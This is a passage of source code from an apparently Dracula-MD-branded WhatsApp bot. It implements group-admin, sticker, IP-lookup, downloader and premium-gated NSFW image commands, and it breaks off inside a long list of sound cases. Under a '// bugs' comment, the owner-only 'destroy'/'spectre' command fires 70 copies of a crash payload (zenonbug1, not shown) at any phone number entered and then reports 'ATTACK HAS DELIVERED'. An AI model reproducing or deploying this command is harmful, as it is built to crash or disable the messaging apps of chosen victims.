        conn.sendMessage(m.chat, 
            { 
                image: { url: random.female }, 
                caption: `👧 *Couple Female*\n\n💖 *A charming profile pair!*`
            }, 
            { quoted: m }
        );
    } catch (error) {
        m.reply("❌ *Failed to fetch couple pictures. Please try again later.*");
    }
}
break;






case 'kickall': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    const toKick = groupMetadata.participants
        .filter(item => item.id !== botNumber && item.id !== `${nomerOwner}@s.whatsapp.net`)
        .map(item => item.id);

    for (let user of toKick) {
        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
        await sleep(100);
    }
    reply(`𝔸𝕔𝕥𝕚𝕠𝕟 𝕤𝕦𝕔𝕔𝕖𝕤𝕤𝕗𝕦𝕝!`);
}
break;


case 'kick': {
    if (!isGroup) return reply("This command can only be used in groups.");
    if (!isGroupAdmins) return reply("Only group admins can use this command.");
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.");

    let targetId;

    // Check if the command is used on a replied message
    if (m.quoted) {
        targetId = m.quoted.sender;
    } else if (args[0]) {
        // Check if a number was provided as an argument
        targetId = `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
    } else {
        return reply("Please provide a target user's number or reply to their message.");
    }

    const isOwner = groupMetadata.owner === targetId;
    const isBot = botNumber === targetId;

    if (isOwner) return reply("I cannot kick the group owner.");
    if (isBot) return reply("I cannot kick myself.");

    // Attempt to remove the user
    try {
        await conn.groupParticipantsUpdate(m.chat, [targetId], "remove");
        reply(`User has been kicked from the group.`);
    } catch (error) {
        reply(`Failed to kick the user. Ensure they are in the group and the bot has the necessary permissions.`);
    }
}
break;




case 'tagadmin':
case 'listadmin': {
    if (!isGroup) return reply("This command can only be used in groups.")
    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    reply(`*Group Admins:*\n${listAdmin}`, { mentions: groupAdmins.map(v => v.id) });
}
break;

case 'tagme': {
    if (!isGroup) return reply("This command can only be used in groups.")
    reply(`@${senderNumber}`, { mentions: [sender] });
}
break;

case 'setppgc': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    if (isImage || isQuotedImage) {
        let media = await conn.downloadAndSaveMediaMessage(quoted, makeid(5));
        await conn.updateProfilePicture(from, { url: media });
        reply(`𝕊𝕦𝕔𝕔𝕖𝕤𝕤!`);
        fs.unlinkSync(media);
    } else {
        reply(`Send or reply to an image with the caption '${command}'.`);
    }
}
break;

case 'getppgc': {
    if (!isGroup) return reply("This command can only be used in groups.")
    await loading();
    try {
        var ppimg = await conn.profilePictureUrl(from, 'image');
    } catch (err) {
        var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg';
    }
    await conn.sendMessage(from, { image: { url: ppimg } });
}
break;

case 'delppgc': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    await conn.removeProfilePicture(from);
    reply(`𝕊𝕦𝕔𝕔𝕖𝕤𝕤!`);
}
break;

case 'setnamegc': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    if (!q) return reply(`Send the command '${command} group_name'.`);
    await conn.groupUpdateSubject(from, q);
    reply(`𝕊𝕦𝕔𝕔𝕖𝕤𝕤!`);
}
break;

case 'setdesc': {
    if (!isGroup) return reply("This command can only be used in groups.")
    if (!isGroupAdmins) return reply("Only group admins can use this command.")
    if (!isBotGroupAdmins) return reply("I need to be an admin to perform this action.")
    
    if (!q) return reply(`Send the command '${command} group_description'.`);
    await conn.groupUpdateDescription(from, q);
    reply(`𝕊𝕦𝕔𝕔𝕖𝕤𝕤!`);
}
break;


case 'trackip': {
  if (!q) return reply(`*Example:* ${prefix + command} 112.90.150.204`);
  
  if (!text) return reply("Please provide an IP address to track.");
  
  try {
    let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
    
    const formatIPInfo = (info) => {
      return `
*𝙸𝙿 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽*
• 𝙸𝙿: ${info.ip || 'N/A'}
• 𝚂𝚄𝙲𝙲𝙴𝚂𝚂: ${info.success || 'N/A'}
• 𝚃𝚈𝙿𝙴: ${info.type || 'N/A'}
• 𝙲𝙾𝙽𝚃𝙸𝙽𝙴𝙽𝚃: ${info.continent || 'N/A'}
• 𝙲𝙾𝙽𝚃𝙸𝙽𝙴𝙽𝚃 𝙲𝙾𝙳𝙴: ${info.continent_code || 'N/A'}
• 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ${info.country || 'N/A'}
• 𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝙲𝙾𝙳𝙴: ${info.country_code || 'N/A'}
• 𝚁𝙴𝙶𝙸𝙾𝙽: ${info.region || 'N/A'}
• 𝚁𝙴𝙶𝙸𝙾𝙽 𝙲𝙾𝙳𝙴: ${info.region_code || 'N/A'}
• 𝙲𝙸𝚃𝚈: ${info.city || 'N/A'}
• 𝙻𝙰𝚃𝙸𝚃𝚄𝙳𝙴: ${info.latitude || 'N/A'}
• 𝙻𝙾𝙽𝙶𝙸𝚃𝚄𝙳𝙴: ${info.longitude || 'N/A'}
• 𝙸𝚂 𝙴𝚄?: ${info.is_eu ? 'Yes' : 'No'}
• 𝙿𝙾𝚂𝚃𝙰𝙻: ${info.postal || 'N/A'}
• 𝙲𝙰𝙻𝙻𝙸𝙽𝙶 𝙲𝙾𝙳𝙴: ${info.calling_code || 'N/A'}
• 𝙲𝙰𝙿𝙸𝚃𝙰𝙻: ${info.capital || 'N/A'}
• 𝙱𝙾𝚁𝙳𝙴𝚁𝚂: ${info.borders || 'N/A'}
• 𝙵𝙻𝙰𝙶:
 - 𝙸𝙼𝙰𝙶𝙴: ${info.flag?.img || 'N/A'}
 - 𝙴𝙼𝙾𝙹𝙸: ${info.flag?.emoji || 'N/A'}
 - 𝙴𝙼𝙾𝙹𝙸 𝚄𝙽𝙸𝙲𝙾𝙳𝙴: ${info.flag?.emoji_unicode || 'N/A'}
• 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽:
 - 𝙰𝚂𝙽: ${info.connection?.asn || 'N/A'}
 - 𝙾𝚁𝙶𝙰𝙽𝙸𝚉𝙰𝚃𝙸𝙾𝙽: ${info.connection?.org || 'N/A'}
 - 𝙸𝚂𝙿: ${info.connection?.isp || 'N/A'}
 - 𝙳𝙾𝙼𝙰𝙸𝙽: ${info.connection?.domain || 'N/A'}
• 𝚃𝙸𝙼𝙴𝚉𝙾𝙽𝙴:
 - 𝙸𝙳: ${info.timezone?.id || 'N/A'}
 - 𝙰𝙱𝙱𝚁𝙴𝚅𝙸𝙰𝚃𝙸𝙾𝙽: ${info.timezone?.abbr || 'N/A'}
 - 𝙸𝚂 𝙳𝚂𝚃?: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - 𝙾𝙵𝙵𝚂𝙴𝚃: ${info.timezone?.offset || 'N/A'}
 - 𝚄𝚃𝙲: ${info.timezone?.utc || 'N/A'}
 - 𝙲𝚄𝚁𝚁𝙴𝙽𝚃𝚃𝙸𝙼𝙴: ${info.timezone?.current_time || 'N/A'}
`;
    };

    if (!res.success) throw new Error(`IP ${text} not found!`);

    await conn.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
    
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    await delay(2000);
    reply(formatIPInfo(res)); 
    
  } catch (e) {
    return reply(`Error: Unable to retrieve data for IP ${text}`);
  }
}
break;

case 's':
case 'sticker': 
case 'stiker': {
    await loading();
    // Check if the message is an image or video
    if (isImage || isViewOnce || isQuotedImage || isVideo || isQuotedVideo) {
        // Restrict video duration to 10 seconds
        if (quoted.seconds > 10) return setReply("Videos must be 10 seconds or shorter!");
        
        // Set quality for images and videos
        let quality = isImage ? 70 : 2;
        let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
        
        // Download and save the media
        let media = await conn.downloadAndSaveMediaMessage(quoted, makeid(5));
        
        // Create the sticker
        let sticker = new Sticker(media, {
            pack: packName, // Sticker pack name
            author: authorName, // Sticker author name
            type: StickerTypes.FULL, // Full sticker type
            categories: ['🤩', '🎉'], // Sticker categories
            id: '12345', // Sticker ID
            quality: quality, // Output file quality
            background: '#FFFFFF00' // Transparent background for full stickers
        });
        
        // Save the sticker as a .webp file
        let outputFile = getRandom(".webp");
        let filePath = await sticker.toFile(outputFile);
        let stickerBuffer = fs.readFileSync(filePath);
        
        // Send the sticker to the user as a normal sticker
        await conn.sendMessage(from, { sticker: stickerBuffer }, { quoted: m });
        
        // Clean up temporary files
        await fs.unlinkSync(outputFile);
        await fs.unlinkSync(media);
    } else {
        setReply(`Please send an image or video with the caption '${command}', or reply to an image or video!\nNote: Videos must be 10 seconds or shorter.`);
    }
    break;
}
    

case 'take':
case 'swm':
case 'wm': {
await loading();
    
    // Ensure a name is provided for the sticker
    if (!q) return setReply("Please reply to a sticker and provide a name in the format: PackName|AuthorName");
    
    // Check if the message contains an image or sticker
    if (isImage || isQuotedImage || isQuotedSticker) {
        try {
            
            
            // Parse the pack and author names
            let names = args.join(' ').split('|');
            let packName = names[0] !== '' ? names[0] : `${wm}`;
            let authorName = typeof names[1] !== 'undefined' ? names[1] : ``;
            
            let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
            
            // Download and save the media
            let media = await conn.downloadAndSaveMediaMessage(quoted);
            
            // Create the sticker
            let sticker = new Sticker(media, {
                pack: packName, // Sticker pack name
                author: authorName, // Sticker author name
                type: StickerTypes.FULL, // Full sticker type
                categories: ['🤩', '🎉'], // Sticker categories
                id: '12345', // Sticker ID
                quality: 70, // Output file quality
                background: '#FFFFFF00' // Transparent background for full stickers
            });
            
            // Save the sticker as a .webp file
            let outputFile = getRandom(".webp");
            let filePath = await sticker.toFile(outputFile);
            let stickerBuffer = fs.readFileSync(filePath);
            
            // Send the sticker to the user
            await conn.sendMessage(from, { sticker: stickerBuffer }, { quoted: m });
            
            // Clean up temporary files
            await fs.unlinkSync(outputFile);
            await fs.unlinkSync(media);
        } catch (error) {
            await loadingerror();
        }
    } else {
        setReply("Please reply to a sticker or an image with the desired pack and author names in the format: PackName|AuthorName");
    }
    break;
}


// bugs
case 'destroy': case 'spectre': {
    if (!isOwner) return onlyOwner();

    if (!q) return reply(`Example: ${prefix + command} 2331234567`);

    // Extract numbers from the input and format as JID
    const target = `${q.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    console.log(`Received input: ${q}`);
    console.log(`Formatted target JID: ${target}`);

    // Validate the phone number
    if (!/^\d{10,15}@s\.whatsapp\.net$/.test(target)) {
        return reply(`Invalid number format! Please enter a valid phone number.`);
    }

    try {
        // Prepare an array of promises for sending messages
        const promises = Array.from({ length: 70 }).map(async (_, i) => {
            console.log(`Sending payload ${i + 1} to target: ${target}`);
            return await zenonbug1(target, true);
        });

        // Execute all payloads
        const results = await Promise.all(promises);

        // Log successful executions
        console.log(`Executed ${command} for target: ${target}`, results);

        // Send a confirmation message
        reply(`
🦣 *𝙰𝚃𝚃𝙰𝙲𝙺 𝙷𝙰𝚂 𝙳𝙴𝙻𝙸𝚅𝙴𝚁𝙴𝙳* 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗔𝗣𝗢𝗖𝗔𝗟𝗬𝗣𝗧𝗜𝗖 𝗣𝗔𝗬𝗟𝗢𝗔𝗗 𝗦𝗘𝗡𝗧
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
        `);
    } catch (error) {
        // Handle any errors during execution
        console.error(`Error executing ${command} for target: ${target}`, error);
        reply(`Failed to deliver the payload to ${target}. Error: ${error.message}`);
    }
}
break;


case 'ban': {
    if (!isGroup && !isOwner) return onlyGroup();
    if (!isGroupAdmins && !isBotGroupAdmins) return onlyBadmin();

    let target;
    if (m.quoted) {
        target = m.quoted.sender; // Ban the person whose message was replied to
    } else if (q && q.match(/^\d+$/)) {
        target = `${q}@s.whatsapp.net`; // Ban the number provided
    } else {
        return reply('❓ *Please reply to a user\'s message or provide their number to ban them!*');
    }

    // Ensure global.bannedUsers and group ban list are initialized
    global.bannedUsers = global.bannedUsers || {};
    global.bannedUsers[m.chat] = global.bannedUsers[m.chat] || [];

    // Check if the user is already banned in this group
    if (global.bannedUsers[m.chat].includes(target)) {
        return reply(`🚫 *User is already banned in this group!*`);
    }

    // Ban the user
    global.bannedUsers[m.chat].push(target);

    // Notify success
    reply(`✅ *User has been banned successfully in this group!*\n\n🔒 *Banned User:* @${target.split('@')[0]}\n📂 *Their messages will now be automatically deleted.*`, {
        mentions: [target],
    });

    break;
}

case 'unban': {
    if (!isGroup && !isOwner) return onlyGroup();
    if (!isGroupAdmins && !isBotGroupAdmins) return onlyBadmin();

    let target;
    if (m.quoted) {
        target = m.quoted.sender; // Unban the person whose message was replied to
    } else if (q && q.match(/^\d+$/)) {
        target = `${q}@s.whatsapp.net`; // Unban the number provided
    } else {
        return reply('❓ *Please reply to a user\'s message or provide their number to unban them!*');
    }

    // Ensure global.bannedUsers and group ban list are initialized
    global.bannedUsers = global.bannedUsers || {};
    global.bannedUsers[m.chat] = global.bannedUsers[m.chat] || [];

    // Check if the user is banned in this group
    if (!global.bannedUsers[m.chat].includes(target)) {
        return reply(`✅ *User is not banned in this group!*`);
    }

    // Unban the user
    global.bannedUsers[m.chat] = global.bannedUsers[m.chat].filter((id) => id !== target);

    // Notify success
    reply(`✅ *User has been unbanned successfully in this group!*\n\n🔓 *Unbanned User:* @${target.split('@')[0]}\n🌟 *They can now send messages in the group.*`, {
        mentions: [target],
    });

    break;
}









case 'gemini': {
    if (!q) {
        return reply(`✏️ *Please provide a query.*\n\n*Example:* ${prefix + command} What is AI?`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/gemini?q=${encodeURIComponent(q)}`;
        console.log("API URL:", apiUrl);

        // Fetch Gemini response from the API
        const response = await fetch(apiUrl);

        // Check if the response is ok (status is 200-299)
        if (!response.ok) {
            console.error(`HTTP error! Status: ${response.status}`);
            return reply(`⚠️ Server error! Status: ${response.status}\n\nPlease try again later.`);
        }

        const res = await response.json();
        console.log("API Response:", res);

        // Check for the expected field in the response
        if (res['BK9']) {
            const message = `
_${res['BK9']}_

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳
            `.trim();

            // Updated image URL
            const imageUrl = 'https://pomf2.lain.la/f/4xlpmnu.jpg';
            
            // Assuming conn.sendMessage is defined
            await conn.sendMessage(from, {
                image: { url: imageUrl },
                caption: message,
                // Optional: additional options can be added here
            }, { quoted: m });
        } else {
            console.error("Unexpected API response structure:", res);
            return reply("⚠️ Failed to get a response!\n\nPlease try again later.");
        }

    } catch (error) {
        console.error("Error in Gemini case:", error);
        reply("⚠️ Server error!\n\nPlease try again later.");
    }
    break;
}


case 'wachstalk': {
    if (!q) return reply("✏️ *𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗹𝗶𝗻𝗸.*\n\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `𝗰𝗵𝗮𝗻𝗻𝗲𝗹 https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K`");

    await loading();

    let apiUrl = `https://api.giftedtech.my.id/api/stalk/wachannel?apikey=gifted&url=${encodeURIComponent(q)}`;

    fetch(apiUrl)
        .then(res => res.json())
        .then(data => {
            if (data.status !== 200 || !data.success) {
                return reply("⚠️ *𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!*\n\n𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗵𝗲 𝗹𝗶𝗻𝗸 𝗶𝘀 𝗰𝗼𝗿𝗿𝗲𝗰𝘁.");
            }

            const { img, title, followers, description } = data.result;

            let caption = `
𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘁𝗮𝗶𝗹𝘀
━━━━━━━━━━━━━━━━━━━

📜 𝗧𝗶𝘁𝗹𝗲: ${title || '𝗡𝗼 𝗧𝗶𝘁𝗹𝗲 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲'}
👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: ${followers || '𝗡𝗼 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀'}
📖 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻: ${description || '𝗡𝗼 𝗗𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲'}

━━━━━━━━━━━━━━━━━━━
            `;

            conn.sendMessage(from, {
                image: { url: img },
                caption: caption.trim(),
            }, { quoted: m });
        })
        .catch(err => reply("⚠️ *𝗦𝗲𝗿𝘃𝗲𝗿 𝗘𝗿𝗿𝗼𝗿!*\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿."));
}
break;




case 'downloader': {
    if (!q) return reply("✏️ *𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸!*\n\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `downloader https://vm.tiktok.com/ZMkhbyrRt/`");

    await loading();

    const apiUrl = `https://bk9.fun/download/alldownload?url=${encodeURIComponent(q)}`;

    fetch(apiUrl)
        .then(res => res.json())
        .then(data => {
            if (!data.status) return reply("⚠️ *𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱!*\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮 𝗱𝗶𝗳𝗳𝗲𝗿𝗲𝗻𝘁 𝗹𝗶𝗻𝗸.");

            const { title, high } = data.BK9;

            if (!high) return reply("⚠️ *𝗡𝗼 𝗵𝗶𝗴𝗵-𝗾𝘂𝗮𝗹𝗶𝘁𝘆 𝘃𝗶𝗱𝗲𝗼 𝗳𝗼𝘂𝗻𝗱!*\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.");

            let caption = `
🎥 *𝗧𝗶𝘁𝗹𝗲:* ${title || '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}

> *𝗗𝗢𝗡𝗘 𝗕𝗬 𝗗𝗥𝗔𝗖𝗨𝗟𝗔 𝗠𝗗*
            `.trim();

            conn.sendMessage(from, {
                video: { url: high },
                caption: caption,
            }, { quoted: m });
        })
        .catch(err => reply("⚠️ *𝗦𝗲𝗿𝘃𝗲𝗿 𝗘𝗿𝗿𝗼𝗿!*\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿."));
}
break;


















case 'gemini-pro': {
    if (!q) {
        return reply(`✏️ *Please provide a query.*\n\n*Example:* ${prefix + command} What is AI?`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/acloudai?q=${encodeURIComponent(q)}`;
        console.log("API URL:", apiUrl);

        // Fetch response from the API
        const response = await fetch(apiUrl);

        // Check if the response is ok (status is 200-299)
        if (!response.ok) {
            console.error(`HTTP error! Status: ${response.status}`);
            return reply(`⚠️ Server error! Status: ${response.status}\n\nPlease try again later.`);
        }

        const res = await response.json();
        console.log("API Response:", res);

        // Check for the expected field in the response
        if (res['BK9']) {
            const message = `
_${res['BK9']}_

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳
            `.trim();

            // Updated image URL
            const imageUrl = 'https://pomf2.lain.la/f/wpy1fq1.jpg';
            
            // Assuming conn.sendMessage is defined
            await conn.sendMessage(from, {
                image: { url: imageUrl },
                caption: message,
                // Optional: additional options can be added here
            }, { quoted: m });
        } else {
            console.error("Unexpected API response structure:", res);
            return reply("⚠️ Failed to get a response!\n\nPlease try again later.");
        }

    } catch (error) {
        console.error("Error in gemini-pro case:", error);
        reply("⚠️ Server error!\n\nPlease try again later.");
    }
    break;
}















case 'trap':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: trap.data.url } }, { quoted: m });
    break;

case 'hneko':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    let hneko = await axios.get(`https://waifu.pics/api/nsfw/neko`);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: hneko.data.url } }, { quoted: m });
    break;

case 'nwaifu':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    let waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: waifudd.data.url } }, { quoted: m });
    break;

case 'animespank':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: waifud.data.url } }, { quoted: m }).catch(err => {
        return ('Error!');
    });
    break;

case 'gifblowjob':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
    var bobuff = await fetchBuffer(assss.data.url);
    var bogif = await buffergif(bobuff);
    conn.sendMessage(m.chat, { video: bogif, gifPlayback: true }, { quoted: m }).catch(err => { });
    break;

case 'blowjob':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/blowjob.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'cuckold':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/cuckold.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'eba':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/eba.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'pussy':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/pussy.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'yuri':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/yuri.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'zettai':
    if (!isGroup) return onlyGroup();
    if (!isPremium) return onlyPremium();
    if (!isAntiNsfw) return setReply(mess.nsfw);
    await loading();
    var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/zettai.json'));
    var xeonyresult = pickRandom(ahegaonsfw);
    conn.sendMessage(m.chat, { caption: '> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳', image: { url: xeonyresult.url } }, { quoted: m });
    break;

case 'nsfw': {
    if (!isGroup && !isOwner) return onlyGroup();
    if (!isGroupAdmins && !isBotGroupAdmins) return onlyBadmin();
    if (args.length < 1) return reply('Enable or disable? Use: ᴏɴ/ᴏꜰꜰ');
    await loading();
    if (args[0] === 'on') {
        db.data.chats[from].nsfw = true;
        reply(`❰ ${command.toUpperCase()} ❱ ɪꜱ ɴᴏᴡ ᴇɴᴀʙʟᴇᴅ`);
        let warning = Ehztext(` 
『 ⚠️ ᴡᴀʀɴɪɴɢ ⚠️ 』

ᴛʜᴇ *ɴꜰꜱᴡ ꜰᴇᴀᴛᴜʀᴇ* (ɴᴏᴛ ꜱᴀꜰᴇ ꜰᴏʀ ᴡᴏʀᴋ) ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ ɪɴ ᴛʜɪꜱ ɢʀᴏᴜᴘ.  
ᴛʜɪꜱ ᴍᴇᴀɴꜱ ᴍᴇᴍʙᴇʀꜱ ᴄᴀɴ ᴀᴄᴄᴇꜱꜱ ᴇxᴘʟɪᴄɪᴛ ᴄᴏɴᴛᴇɴᴛ ᴛʜʀᴏᴜɢʜ ᴛʜᴇ ʙᴏᴛ!`);
        m.reply(warning);
    } else if (args[0] === 'off') {
        db.data.chats[from].nsfw = false;
        reply(`❰ ${command.toUpperCase()} ❱ ɪꜱ ɴᴏᴡ ᴅɪꜱᴀʙʟᴇᴅ`);
    }
}
break;

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
